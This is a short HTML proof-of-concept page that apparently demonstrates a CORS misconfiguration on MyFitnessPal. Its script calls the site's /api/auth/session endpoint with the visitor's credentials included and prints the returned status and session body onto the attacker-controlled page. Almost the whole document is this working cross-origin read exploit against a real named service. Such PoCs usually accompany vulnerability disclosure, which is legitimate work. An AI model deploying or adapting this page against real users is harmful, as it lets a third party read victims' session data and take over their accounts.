<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>MyFitnessPal CORS PoC</title>
</head>
<body>
<h2>MyFitnessPal â€“ CORS Read PoC</h2>
<pre id="output">Loading...</pre>

<script>
fetch("https://www.myfitnesspal.com/api/auth/session", {
  method: "GET",
  credentials: "include"
})
.then(response => {
  document.getElementById("output").innerText =
    "Status: " + response.status + "\n\n";
  return response.text();
})
.then(data => {
  document.getElementById("output").innerText +=
    "Response Body:\n" + data;
})
.catch(err => {
  document.getElementById("output").innerText =
    "Error:\n" + err;
});
</script>
</body>
</html>
